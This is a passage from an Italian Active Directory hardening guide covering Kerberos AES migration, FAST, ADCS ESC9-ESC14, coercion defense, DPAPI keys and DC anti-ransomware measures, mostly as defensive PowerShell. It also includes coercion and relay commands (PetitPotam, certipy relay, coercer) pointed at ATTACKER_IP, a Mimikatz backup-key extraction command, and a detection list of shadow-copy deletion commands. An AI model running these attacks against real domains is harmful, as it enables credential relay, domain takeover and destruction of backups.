    -Path "C:\JEA\DNSAdmin.pssc" -Force

# 4. Utilizzare l'endpoint JEA
# L'amministratore DNS si connette con:
Enter-PSSession -ComputerName DC01 -ConfigurationName DNSAdmin
# Vedrà SOLO i cmdlet DNS autorizzati, nient'altro
```

---

## 12. Hardening Kerberos Avanzato — AES, FAST Armoring, e Deprecazione RC4

### 12.1 Deprecazione RC4 e Migrazione ad AES

A partire da Windows Server 2025, Microsoft ha iniziato il processo formale di deprecazione di RC4 per l'autenticazione Kerberos. RC4-HMAC (encryption type 0x17) è l'algoritmo storicamente utilizzato per la crittografia dei ticket Kerberos, ma è significativamente più debole di AES e rappresenta il vettore principale per gli attacchi Kerberoasting (la velocità di cracking di RC4 è ordini di grandezza superiore rispetto ad AES).

**Timeline di deprecazione RC4 (Microsoft, CVE-2026-20833):**

| Data | Fase | Azione |
|------|------|--------|
| Gennaio 2026 | Initial Deployment | Aggiornamenti con telemetria di audit per RC4 |
| Aprile 2026 | Default Change | `DefaultDomainSupportedEncTypes` cambia a AES-only (0x18) per account senza `msDS-SupportedEncryptionTypes` esplicito |
| Luglio 2026 | Enforcement | Modalità di enforcement attivata; RC4 disabilitato a meno di override esplicito |

**Valori di `msDS-SupportedEncryptionTypes`:**

| Valore | Encryption Types Supportati | Uso Raccomandato |
|--------|----------------------------|-----------------|
| 0x0 | Non configurato (usa default DC) | Legacy — da aggiornare |
| 0x4 | DES-CBC-MD5 | **MAI** — deprecato, insicuro |
| 0x8 | RC4-HMAC | **Sconsigliato** — kerberoasting facile |
| 0x10 | AES128-CTS-HMAC-SHA1-96 | Accettabile |
| 0x18 | AES128 + AES256 | **Raccomandato minimo** |
| 0x1C | RC4 + AES128 + AES256 | Transizione — mantenere temporaneamente |
| 0x7FFFFFF8 | AES + FAST + Compound Identity + Claims | **Configurazione ottimale** |

```powershell
# === SCRIPT COMPLETO PER MIGRAZIONE DA RC4 AD AES ===

# FASE 1: AUDIT — Identificare chi utilizza ancora RC4

Write-Host "=== FASE 1: AUDIT RC4 ===" -ForegroundColor Cyan

# 1a. Trovare account con msDS-SupportedEncryptionTypes non configurato o con RC4
Write-Host "`n[+] Account utente senza AES configurato:" -ForegroundColor Yellow
Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes,
    ServicePrincipalName | Where-Object {
    $_.'msDS-SupportedEncryptionTypes' -eq $null -or
    ($_.'msDS-SupportedEncryptionTypes' -band 0x8) -and
    -not ($_.'msDS-SupportedEncryptionTypes' -band 0x10)
} | Select-Object SamAccountName, @{N='EncTypes';E={$_.'msDS-SupportedEncryptionTypes'}},
    @{N='HasSPN';E={$_.ServicePrincipalName.Count -gt 0}} |
    Format-Table -AutoSize

# 1b. Trovare computer con encryption type legacy
Write-Host "`n[+] Computer con encryption type non-AES:" -ForegroundColor Yellow
Get-ADComputer -Filter * -Properties msDS-SupportedEncryptionTypes |
    Where-Object {
        $_.'msDS-SupportedEncryptionTypes' -ne $null -and
        $_.'msDS-SupportedEncryptionTypes' -ne 0 -and
        -not ($_.'msDS-SupportedEncryptionTypes' -band 0x10)
    } | Select-Object Name, @{N='EncTypes';E={$_.'msDS-SupportedEncryptionTypes'}} |
    Format-Table -AutoSize

# 1c. Abilitare audit di RC4 tramite GPO
# Evento 4769 con TicketEncryptionType = 0x17 indica uso di RC4
Write-Host "`n[+] Verifico eventi RC4 recenti (ultimi 7 giorni):" -ForegroundColor Yellow
$startDate = (Get-Date).AddDays(-7)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4769
    StartTime = $startDate
} -MaxEvents 5000 -ErrorAction SilentlyContinue | Where-Object {
    $_.Properties[5].Value -eq "0x17"
} | Group-Object {$_.Properties[2].Value} |
    Sort-Object Count -Descending |
    Select-Object @{N='ServiceName';E={$_.Name}}, Count |
    Format-Table -AutoSize

# FASE 2: CONFIGURARE AES PER TUTTI GLI ACCOUNT SERVICE

Write-Host "`n=== FASE 2: CONFIGURAZIONE AES ===" -ForegroundColor Cyan

# 2a. Impostare AES per tutti gli account con SPN (service account)
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties msDS-SupportedEncryptionTypes |
    ForEach-Object {
        $currentET = $_.'msDS-SupportedEncryptionTypes'
        if ($currentET -eq $null -or $currentET -eq 0 -or $currentET -eq 0x4 -or $currentET -eq 0x8) {
            Write-Host "  Aggiornamento $($_.SamAccountName): $currentET → 0x18 (AES-only)" -ForegroundColor Green
            Set-ADUser -Identity $_.SamAccountName -Replace @{
                'msDS-SupportedEncryptionTypes' = 0x18
            }
        }
    }

# 2b. Impostare AES per tutti i computer
Get-ADComputer -Filter * -Properties msDS-SupportedEncryptionTypes |
    Where-Object {
        $_.'msDS-SupportedEncryptionTypes' -eq $null -or
        $_.'msDS-SupportedEncryptionTypes' -eq 0
    } | ForEach-Object {
        Set-ADComputer -Identity $_.Name -Replace @{
            'msDS-SupportedEncryptionTypes' = 0x18
        }
    }

# FASE 3: DISABILITARE RC4 A LIVELLO DI DOMINIO

# 3a. Via GPO — Domain Controller policy
# Computer Configuration → Policies → Windows Settings → Security Settings
#   → Local Policies → Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# Selezionare SOLO: AES128_HMAC_SHA1, AES256_HMAC_SHA1, Future encryption types

# 3b. Via registro (su ogni DC)
# ATTENZIONE: testare in ambiente di staging prima della produzione!
# Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" `
#     -Name "SupportedEncryptionTypes" -Value 0x18 -Type DWord
```

### 12.2 Kerberos FAST Armoring (Flexible Authentication Secure Tunneling)

FAST (RFC 6113) crea un tunnel crittografato attorno allo scambio di pre-autenticazione Kerberos. Questo impedisce attacchi di tipo AS-REP Roasting e offline brute-force perché il pre-authentication exchange è protetto all'interno del canale FAST.

**Prerequisiti FAST:**
- Domain Functional Level: Windows Server 2012 o superiore
- Tutti i DC devono supportare FAST
- Client Windows 8 / Windows Server 2012 o superiore
- Computer account del client deve essere nel dominio (FAST usa il TGT del computer come armor TGT)

```powershell
# === CONFIGURAZIONE FAST ARMORING ===

# 1. Abilitare FAST sul KDC (Domain Controller)
# GPO → Computer Configuration → Administrative Templates
#   → System → KDC
# "KDC support for claims, compound authentication and Kerberos armoring"
#   → Enabled: "Always provide claims" (se funzionale level >= 2012)
#   → Oppure: "Supported" (per roll-out graduale)

# 2. Richiedere FAST sui client (opzionale — enforcement)
# GPO → Computer Configuration → Administrative Templates
#   → System → Kerberos
# "Kerberos client support for claims, compound authentication and Kerberos armoring"
#   → Enabled

# 3. Forzare FAST armoring (massima sicurezza)
# GPO → Computer Configuration → Administrative Templates
#   → System → Kerberos
# "Fail authentication requests when Kerberos armoring is not available"
#   → Enabled
# ATTENZIONE: disabilita l'autenticazione per client che non supportano FAST

# 4. Verificare che FAST sia attivo
# Analizzare Event ID 4768 (TGT request) — il campo "Pre-Authentication Type"
# mostrerà valore 138 (PA-FX-FAST) se FAST è in uso
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4768} -MaxEvents 20 |
    ForEach-Object {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            User = $_.Properties[0].Value
            PreAuthType = $_.Properties[4].Value
            EncType = $_.Properties[5].Value
            IsFAST = ($_.Properties[4].Value -eq "138")
        }
    } | Format-Table -AutoSize
```

### 12.3 PKINIT e Autenticazione Basata su Certificato

PKINIT (Public Key Cryptography for Initial Authentication in Kerberos, RFC 4556) sostituisce la pre-autenticazione basata su password con l'autenticazione a chiave pubblica tramite certificato X.509. Questo elimina completamente il rischio di AS-REP Roasting e riduce l'esposizione alla compromissione delle password.

```powershell
# Verificare che PKINIT sia configurato correttamente
# 1. Il DC deve avere un certificato "Kerberos Authentication"
# 2. Il client deve avere un certificato "Smartcard Logon" o "Client Authentication"

# Verificare certificati del DC per PKINIT
$dcCerts = Get-ChildItem -Path Cert:\LocalMachine\My |
    Where-Object {
        $_.EnhancedKeyUsageList.ObjectId -contains "1.3.6.1.5.2.3.5"  # KDC Authentication
    }
Write-Host "Certificati KDC per PKINIT: $($dcCerts.Count)"
$dcCerts | Select-Object Subject, NotAfter, Thumbprint | Format-Table -AutoSize

# Forzare strong certificate mapping (protezione da ESC9/ESC10)
# Registro su DC:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
    -Name "StrongCertificateBindingEnforcement" -Value 2 -Type DWord
# 0 = Disabled, 1 = Compatibility mode (default), 2 = Full enforcement
```

---

## 13. ADCS Security Avanzata — ESC9 fino a ESC14

### 13.1 Panoramica delle Nuove Vulnerabilità ADCS

Oltre alle vulnerabilità ESC1-ESC8 descritte nella Sezione 8, la ricerca continua ha identificato ulteriori classi di escalation che sfruttano configurazioni errate dei certificati e dei meccanismi di mapping.

| ESC | Nome | Vettore | Impatto |
|-----|------|---------|---------|
| ESC9 | No Security Extension | Flag `CT_FLAG_NO_SECURITY_EXTENSION` impedisce l'embedding della security extension szOID_NTDS_CA_SECURITY_EXT | Bypass strong certificate mapping |
| ESC10 | Weak Certificate Mapping | Configurazione debole del mapping certificato dopo patch CVE-2022-26923 | Impersonazione di account arbitrari |
| ESC11 | RPC Endpoint Relay | Interfaccia RPC di enrollment senza packet privacy | NTLM relay a endpoint RPC del CA |
| ESC12 | YubiHSM Key Access | HSM YubiHSM2 con password di autenticazione nel registro | Accesso alle chiavi private del CA |
| ESC13 | Issuance Policy OID | Template con OID di issuance policy collegato a gruppo AD privilegiato | Privilege escalation via group membership |
| ESC14 | altSecurityIdentities | Attributo `altSecurityIdentities` configurato in modo errato | Impersonazione via mapping certificato esplicito |

### 13.2 ESC9 e ESC10 — Weak Certificate Mapping

ESC9 e ESC10 sono emersi come conseguenza delle patch Microsoft per CVE-2022-26923 (CertiFried). Microsoft ha introdotto un meccanismo di strong certificate mapping che inserisce il SID dell'account richiedente nel certificato tramite la security extension `szOID_NTDS_CA_SECURITY_EXT`. Tuttavia, se il flag `CT_FLAG_NO_SECURITY_EXTENSION` è attivo su un template, questa protezione viene bypassata.

```powershell
# === RILEVAMENTO ESC9 ===
# Trovare template con CT_FLAG_NO_SECURITY_EXTENSION

$configNC = (Get-ADRootDSE).configurationNamingContext
$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC" `
    -Filter * -Properties msPKI-Enrollment-Flag, msPKI-Certificate-Name-Flag, Name

foreach ($t in $templates) {
    $enrollFlags = $t.'msPKI-Enrollment-Flag'
    # CT_FLAG_NO_SECURITY_EXTENSION = 0x80000 (bit 19)
    if ($enrollFlags -band 0x80000) {
        Write-Warning "ESC9 POTENZIALE: Template '$($t.Name)' ha CT_FLAG_NO_SECURITY_EXTENSION attivo"
        Write-Host "  msPKI-Enrollment-Flag: $enrollFlags"
    }
}

# === RILEVAMENTO ESC10 ===
# Verificare la configurazione di strong certificate mapping sul DC
$strongBinding = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
    -Name "StrongCertificateBindingEnforcement" -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement

switch ($strongBinding) {
    $null { Write-Warning "ESC10: StrongCertificateBindingEnforcement NON CONFIGURATO (default: 1 = Compatibility)" }
    0 { Write-Warning "ESC10 CRITICO: StrongCertificateBindingEnforcement = 0 (DISABILITATO)" }
    1 { Write-Warning "ESC10 ATTENZIONE: StrongCertificateBindingEnforcement = 1 (Compatibility mode - parzialmente vulnerabile)" }
    2 { Write-Host "ESC10 OK: StrongCertificateBindingEnforcement = 2 (Full Enforcement)" -ForegroundColor Green }
}

# Verificare anche il registry key CertificateMappingMethods
$mappingMethods = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" `
    -Name "CertificateMappingMethods" -ErrorAction SilentlyContinue).CertificateMappingMethods

if ($mappingMethods -band 0x4) {
    Write-Warning "Weak mapping method attivo: UPN mapping (0x4) — vulnerabile a ESC10"
}
```

**Remediation ESC9/ESC10:**

```powershell
# 1. Rimuovere CT_FLAG_NO_SECURITY_EXTENSION dai template vulnerabili
$vulnTemplateDN = "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
$template = Get-ADObject $vulnTemplateDN -Properties msPKI-Enrollment-Flag
$currentFlags = $template.'msPKI-Enrollment-Flag'
$newFlags = $currentFlags -band (-bnot 0x80000)  # Rimuovere bit 19
Set-ADObject $vulnTemplateDN -Replace @{'msPKI-Enrollment-Flag' = $newFlags}

# 2. Forzare strong certificate mapping su TUTTI i DC
# Registry su ogni DC:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
    -Name "StrongCertificateBindingEnforcement" -Value 2 -Type DWord

# 3. Disabilitare weak mapping methods
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" `
    -Name "CertificateMappingMethods" -Value 0x18 -Type DWord  # Solo strong methods
```

### 13.3 ESC11 — NTLM Relay a Endpoint RPC

Se l'interfaccia RPC di enrollment del CA non richiede packet privacy (autenticazione e crittografia RPC), è possibile effettuare un NTLM relay verso l'endpoint RPC per richiedere certificati.

```bash
# Rilevamento ESC11 — verificare se il CA accetta connessioni RPC senza privacy
certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable -stdout | grep "ESC11"

# Sfruttamento ESC11 (per test autorizzati)
# Relay NTLM a endpoint RPC del CA
certipy relay -ca ca.domain.local -template DomainController
# Combinare con coercion (PetitPotam, PrinterBug)
python3 PetitPotam.py ATTACKER_IP DC01.DOMAIN.LOCAL
```

**Mitigazione ESC11:**

```powershell
# Richiedere packet privacy sull'interfaccia RPC del CA
# Sul server CA:
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
Restart-Service certsvc

# Verificare la configurazione:
certutil -getreg CA\InterfaceFlags
# IF_ENFORCEENCRYPTICERTREQUEST (0x00000200) deve essere presente
```

### 13.4 ESC13 — Issuance Policy e Group Membership

ESC13 sfrutta template di certificato che contengono un OID (Object Identifier) di issuance policy collegato a un gruppo AD ad alto privilegio tramite la configurazione di AD. Quando un utente ottiene un certificato con quell'issuance policy, il certificato effettivamente concede l'appartenenza al gruppo collegato.

```powershell
# === RILEVAMENTO ESC13 ===

# Trovare OID di issuance policy con link a gruppi
$oidContainer = "CN=OID,CN=Public Key Services,CN=Services,$configNC"
$oids = Get-ADObject -SearchBase $oidContainer -Filter {objectClass -eq "msPKI-Enterprise-Oid"} `
    -Properties msPKI-Cert-Template-OID, msDS-OIDToGroupLink, DisplayName

foreach ($oid in $oids) {
    if ($oid.'msDS-OIDToGroupLink') {
        $linkedGroup = $oid.'msDS-OIDToGroupLink'
        Write-Warning "ESC13: OID '$($oid.DisplayName)' collegato al gruppo: $linkedGroup"

        # Verificare quali template usano questa issuance policy
        $templatesWithPolicy = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC" `
            -Filter * -Properties msPKI-Certificate-Policy |
            Where-Object { $_.'msPKI-Certificate-Policy' -contains $oid.'msPKI-Cert-Template-OID' }

        foreach ($tmpl in $templatesWithPolicy) {
            Write-Host "  Template che usa questa policy: $($tmpl.Name)" -ForegroundColor Red
        }
    }
}

# Remediation: rimuovere il link msDS-OIDToGroupLink
# Set-ADObject $oid.DistinguishedName -Clear msDS-OIDToGroupLink
```

### 13.5 ESC14 — Abuso di altSecurityIdentities

L'attributo `altSecurityIdentities` sugli oggetti utente e computer AD consente agli amministratori di mappare manualmente certificati specifici ad account. Se un attaccante può scrivere su questo attributo, o se il mapping è configurato in modo debole, può forgiare o ottenere un certificato corrispondente per impersonare l'account target.

```powershell
# === RILEVAMENTO ESC14 ===

# Trovare account con altSecurityIdentities configurato
Get-ADUser -Filter {altSecurityIdentities -like "*"} -Properties altSecurityIdentities |
    Select-Object SamAccountName, altSecurityIdentities | Format-Table -AutoSize

Get-ADComputer -Filter {altSecurityIdentities -like "*"} -Properties altSecurityIdentities |
    Select-Object Name, altSecurityIdentities | Format-Table -AutoSize

# Verificare chi ha permessi di scrittura su altSecurityIdentities per account critici
$criticalAccounts = Get-ADUser -Filter {AdminCount -eq 1}
foreach ($account in $criticalAccounts) {
    $acl = Get-Acl "AD:\$($account.DistinguishedName)"
    $writeAltSecId = $acl.Access | Where-Object {
        $_.ActiveDirectoryRights -match "WriteProperty" -and
        ($_.ObjectType -eq "00fbf30c-91fe-11d1-aebc-0000f80367c1" -or  # altSecurityIdentities
         $_.ActiveDirectoryRights -match "GenericAll|GenericWrite")
    }
    if ($writeAltSecId) {
        foreach ($ace in $writeAltSecId) {
            Write-Warning "ESC14: '$($ace.IdentityReference)' può scrivere altSecurityIdentities su '$($account.SamAccountName)'"
        }
    }
}
```

---

## 14. Attacchi di Coercion e Difesa Completa

### 14.1 Tassonomia degli Attacchi di Coercion

Gli attacchi di coercion forzano un server Windows (tipicamente un DC) ad autenticarsi verso una macchina controllata dall'attaccante, permettendo relay NTLM o cattura di credenziali. Nella Sezione 4.4 e 4.5 abbiamo trattato PrinterBug e PetitPotam; qui espandiamo la copertura completa.

| Protocollo | Attacco | Interfaccia RPC | Autenticazione Richiesta | Servizio da Disabilitare |
|-----------|---------|----------------|------------------------|------------------------|
| MS-RPRN | PrinterBug / SpoolSample | `\pipe\spoolss` | Sì | Print Spooler |
| MS-EFSRPC | PetitPotam | `\pipe\efsrpc` + `\pipe\lsarpc` | Sì (post-patch) | EFS non facilmente disabilitabile |
| MS-DFSNM | DFSCoerce | `\pipe\netdfs` | Sì | DFS Namespace (se non utilizzato) |
| MS-FSRVP | ShadowCoerce | `\pipe\FssagentRpc` | Sì | File Server VSS Agent Service |
| MS-EVEN | EvenCoerce | `\pipe\eventlog` | Sì | Event Log (non disabilitare) |

**Strumento unificato: Coercer**

```bash
# Coercer — test automatico di tutti i metodi di coercion
# Installazione
pip install coercer

# Scansione per metodi di coercion disponibili (senza sfruttamento)
coercer scan -u user -p password -d domain.local -t DC01.domain.local

# Sfruttamento con listener specifico
coercer coerce -u user -p password -d domain.local \
    -t DC01.domain.local -l ATTACKER_IP \
    --filter-protocol-name MS-RPRN  # Solo PrinterBug

# Test tutti i metodi
coercer coerce -u user -p password -d domain.local \
    -t DC01.domain.local -l ATTACKER_IP --always-continue
```

### 14.2 Difesa Completa Anti-Coercion

```powershell
# === SCRIPT DI HARDENING ANTI-COERCION PER DOMAIN CONTROLLERS ===

Write-Host "=== HARDENING ANTI-COERCION ===" -ForegroundColor Cyan

# 1. Disabilitare Print Spooler su TUTTI i DC
Write-Host "[1/6] Disabilitazione Print Spooler..." -ForegroundColor Yellow
$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    Invoke-Command -ComputerName $dc.HostName -ScriptBlock {
        Stop-Service -Name Spooler -Force -ErrorAction SilentlyContinue
        Set-Service -Name Spooler -StartupType Disabled
        Write-Host "  Print Spooler disabilitato su $env:COMPUTERNAME" -ForegroundColor Green
    }
}

# 2. Disabilitare File Server VSS Agent Service (ShadowCoerce)
Write-Host "[2/6] Disabilitazione File Server VSS Agent..." -ForegroundColor Yellow
foreach ($dc in $dcs) {
    Invoke-Command -ComputerName $dc.HostName -ScriptBlock {
        Stop-Service -Name "INTEGRITYSERVICE" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "INTEGRITYSERVICE" -StartupType Disabled -ErrorAction SilentlyContinue
        # Nome alternativo
        Stop-Service -Name "swprv" -Force -ErrorAction SilentlyContinue
        Write-Host "  VSS Agent gestito su $env:COMPUTERNAME" -ForegroundColor Green
    }
}

# 3. Abilitare EPA (Extended Protection for Authentication) su LDAP
Write-Host "[3/6] Configurazione EPA su LDAP..." -ForegroundColor Yellow
foreach ($dc in $dcs) {
    Invoke-Command -ComputerName $dc.HostName -ScriptBlock {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
            -Name "LdapEnforceChannelBinding" -Value 2 -Type DWord
        Write-Host "  LDAP Channel Binding = Always su $env:COMPUTERNAME" -ForegroundColor Green
    }
}

# 4. Richiedere SMB signing (previene relay SMB)
Write-Host "[4/6] Enforcement SMB Signing..." -ForegroundColor Yellow
foreach ($dc in $dcs) {
    Invoke-Command -ComputerName $dc.HostName -ScriptBlock {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
            -Name "RequireSecuritySignature" -Value 1 -Type DWord
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
            -Name "RequireSecuritySignature" -Value 1 -Type DWord
        Write-Host "  SMB Signing enforced su $env:COMPUTERNAME" -ForegroundColor Green
    }
}

# 5. Richiedere packet privacy su RPC del CA (anti-ESC11)
Write-Host "[5/6] Verifica RPC packet privacy sul CA..." -ForegroundColor Yellow
# Questo va eseguito SOLO sul server CA, non sui DC
# certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
# Restart-Service certsvc

# 6. Configurare Windows Firewall per bloccare traffico in uscita non necessario dai DC
Write-Host "[6/6] Configurazione Firewall DC..." -ForegroundColor Yellow
# I DC non dovrebbero iniziare connessioni SMB/RPC verso workstation
# Regola esempio (da adattare all'ambiente):
# New-NetFirewallRule -DisplayName "Block Outbound SMB from DC" `
#     -Direction Outbound -Protocol TCP -RemotePort 445 `
#     -RemoteAddress "10.0.2.0/24" `  # Subnet workstation
#     -Action Block -Profile Domain

Write-Host "`n=== HARDENING COMPLETATO ===" -ForegroundColor Green
Write-Host "NOTA: Riavviare i DC per applicare tutte le modifiche." -ForegroundColor Yellow
```

---

## 15. Protezione DPAPI e Backup Chiavi di Dominio

### 15.1 Architettura DPAPI nel Contesto AD

DPAPI (Data Protection Application Programming Interface) è il meccanismo di Windows per la protezione trasparente di dati sensibili: password salvate nel browser, credenziali archiviate in Credential Manager, chiavi Wi-Fi, certificati utente, e molto altro. In un ambiente di dominio, le chiavi DPAPI vengono sincronizzate con i Domain Controller tramite le DPAPI Backup Keys.

**Rischio critico:** Le DPAPI Backup Keys vengono generate una sola volta durante la creazione iniziale del dominio e attualmente non esiste un metodo ufficiale Microsoft per la rotazione. Chiunque ottenga le DPAPI Backup Keys (tramite DCSync, compromissione del DC, o estrazione da backup) può decrittare i dati DPAPI di qualsiasi utente del dominio, anche dopo il cambio password dell'utente.

```powershell
# === AUDIT DPAPI BACKUP KEYS ===

# Verificare l'accesso alle DPAPI Backup Keys
# Solo Domain Admins dovrebbero poter accedere a questi oggetti

# 1. Estrarre informazioni sulle DPAPI Backup Keys (senza estrarre le chiavi)
# Le chiavi sono memorizzate come oggetti secret in LSA
# Su un DC, sono accessibili tramite:
# lsadump::backupkeys /system:dc01.domain.local /export  (Mimikatz — richiede DA)

# 2. Monitorare l'accesso alle DPAPI Backup Keys
# Abilitare audit su LSA secrets:
auditpol /set /subcategory:"DPAPI Activity" /success:enable /failure:enable

# 3. Verificare Event ID 4692 (Backup of DPAPI master key was attempted)
# e Event ID 4693 (Recovery of DPAPI master key was attempted)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = @(4692, 4693)
} -MaxEvents 100 -ErrorAction SilentlyContinue |
    Select-Object TimeCreated, Id, Message | Format-List
```

### 15.2 Implicazioni di una Compromissione DPAPI

Se le DPAPI Backup Keys vengono compromesse, le conseguenze sono devastanti e permanenti:

1. **Decrittazione universale**: Tutti i dati protetti da DPAPI per ogni utente del dominio sono accessibili, incluse password salvate nei browser (Chrome, Edge, Firefox con integrazione DPAPI), credenziali Credential Manager, certificati con chiave privata esportabile, e chiavi Wi-Fi aziendali.

2. **Non revocabilità**: A differenza della chiave krbtgt (che può essere ruotata due volte), le DPAPI Backup Keys non possono essere ruotate. Il cambio password degli utenti non invalida la capacità dell'attaccante di decrittare.

3. **Unica remediation**: L'unica soluzione è la migrazione a un nuovo dominio con nuove DPAPI Backup Keys, operazione estremamente costosa e disruptive.

**Misure di protezione preventive:**

```powershell
# === PROTEZIONE DPAPI BACKUP KEYS ===

# 1. Limitare rigorosamente l'accesso ai DC
# Le DPAPI Backup Keys risiedono nella SAM/LSA del DC
# Proteggere i DC come descritto nel Control Plane (Sezione 11)

# 2. Proteggere i backup contenenti NTDS.DIT
# I backup dei DC contengono le DPAPI Backup Keys
# DEVONO essere crittografati e conservati in storage immutabile

# 3. Monitorare tentativi di estrazione
# Sigma Rule per DPAPI backup key access
# title: DPAPI Backup Key Extraction Attempt
# logsource:
#   product: windows
#   service: security
# detection:
#   selection:
#     EventID:
#       - 4662
#     Properties|contains:
#       - 'BCKUPKEY'
#   condition: selection
# level: critical

# 4. Implementare Credential Guard (VBS) su tutti i sistemi
# Credential Guard protegge le chiavi DPAPI in memoria
# (ma non protegge le Backup Keys sul DC)

# 5. Pianificare la migrazione a Credential Guard per tutti i tier
# Computer Configuration → Administrative Templates → System → Device Guard
# "Turn On Virtualization Based Security" = Enabled
# "Credential Guard Configuration" = Enabled with UEFI lock
```

---

## 16. Protezione dei Domain Controller contro Ransomware

### 16.1 Vettori di Attacco Ransomware verso i DC

Nel 2025-2026, i gruppi ransomware hanno identificato i Domain Controller come obiettivi primari. La compromissione di un DC consente la distribuzione del ransomware all'intera organizzazione in minuti tramite GPO, script di logon, o scheduled task propagati via dominio. Gli attacchi recenti (Marks & Spencer 2025, MOVEit-related incidents) dimostrano che il percorso "workstation compromessa → lateral movement → DC → ransomware enterprise-wide" si realizza in meno di 48 ore.

**Fasi tipiche dell'attacco ransomware via DC:**

```
1. Accesso Iniziale (phishing, VPN compromessa, RDP esposto)
   ↓
2. Credential Harvesting (LSASS dump, Kerberoasting)
   ↓
3. Lateral Movement (PtH, WMI, PsExec)
   ↓
4. Domain Admin (DCSync, ACL abuse, ADCS)
   ↓
5. Estrazione NTDS.DIT (per cracking offline e persistenza)
   ↓
6. Distribuzione Ransomware via GPO o Scheduled Task
   ↓
7. Eliminazione Backup (Volume Shadow Copy, backup agents)
   ↓
8. Encryption e Richiesta Riscatto
```

### 16.2 Hardening Anti-Ransomware per Domain Controller

```powershell
# === HARDENING DC ANTI-RANSOMWARE ===

# 1. PROTEZIONE NTDS.DIT
# Il file NTDS.DIT contiene tutti gli hash delle password del dominio
# Percorso default: C:\Windows\NTDS\ntds.dit

# 1a. Abilitare protezione BitLocker sul volume NTDS
# (Richiede TPM o chiave di avvio USB)
Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 `
    -TpmProtector -UsedSpaceOnly

# 1b. Monitorare accesso al file NTDS.DIT
# Configurare SACL su C:\Windows\NTDS\
$ntdsPath = "C:\Windows\NTDS"
$acl = Get-Acl $ntdsPath
$auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone", "Read,Write,Delete", "ContainerInherit,ObjectInherit",
    "None", "Success,Failure"
)
$acl.AddAuditRule($auditRule)
Set-Acl -Path $ntdsPath -AclObject $acl

# 2. PROTEZIONE DSRM (Directory Services Restore Mode)
# La password DSRM è una backdoor locale al DC
# Deve essere complessa, unica per ogni DC, e ruotata regolarmente

# 2a. Verificare la configurazione DSRM
$dsrmBehavior = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior
switch ($dsrmBehavior) {
    $null { Write-Host "DSRM: Default (login solo in DSRM mode) — OK" -ForegroundColor Green }
    0 { Write-Host "DSRM: Login solo in DSRM mode — OK" -ForegroundColor Green }
    1 { Write-Warning "DSRM: Login consentito quando il servizio AD è fermo — RISCHIO MEDIO" }
    2 { Write-Warning "DSRM CRITICO: Login consentito SEMPRE — l'account DSRM può essere usato come backdoor!" }
}

# 2b. Se DsrmAdminLogonBehavior = 2, correggere immediatamente:
# Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
#     -Name "DsrmAdminLogonBehavior" -Value 0 -Type DWord

# 3. PROTEZIONE VOLUME SHADOW COPIES
# I ransomware cancellano i shadow copies per impedire il recovery
# Monitorare comandi come: vssadmin delete shadows, wmic shadowcopy delete

# Sigma Rule per rilevamento eliminazione shadow copies:
# EventID: 4688 (Process Creation) con CommandLine contenente:
# - "vssadmin delete shadows"
# - "wmic shadowcopy delete"  
# - "bcdedit /set {default} recoveryenabled No"
# - "wbadmin delete catalog"

# 4. PROTEZIONE BACKUP
# 4a. Mantenere backup offline (air-gapped) dei DC
# 4b. Utilizzare storage immutabile per backup (WORM — Write Once Read Many)
# 4c. Testare regolarmente il ripristino da backup
# 4d. Separare le credenziali dell'infrastruttura di backup dai domini AD

# 5. ASR (Attack Surface Reduction) RULES SUI DC
# Abilitare via Intune o GPO:
# - Block credential stealing from Windows LSASS
# - Block process creations from PsExec and WMI commands
# - Block executable content from email client and webmail

# 6. SECURE BOOT E UEFI
# Verificare che Secure Boot sia attivo su tutti i DC
Confirm-SecureBootUEFI  # Restituisce True se Secure Boot è attivo
```

### 16.3 Piano di Disaster Recovery per Active Directory

Un piano di DR per AD deve coprire due scenari: ripristino di singoli DC e ripristino dell'intera foresta dopo una compromissione totale.

```powershell
# === BACKUP STRATEGY PER DC ===

# Backup completo System State (include NTDS.DIT, SYSVOL, Registry, Boot files)
# Utilizzare Windows Server Backup:
wbadmin start systemstatebackup -backupTarget:E: -quiet

# Schedulare backup giornaliero
$action = New-ScheduledTaskAction -Execute "wbadmin" `
    -Argument "start systemstatebackup -backupTarget:E: -quiet"
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
Register-ScheduledTask -TaskName "DC-SystemState-Backup" `
    -Action $action -Trigger $trigger -RunLevel Highest -User "SYSTEM"

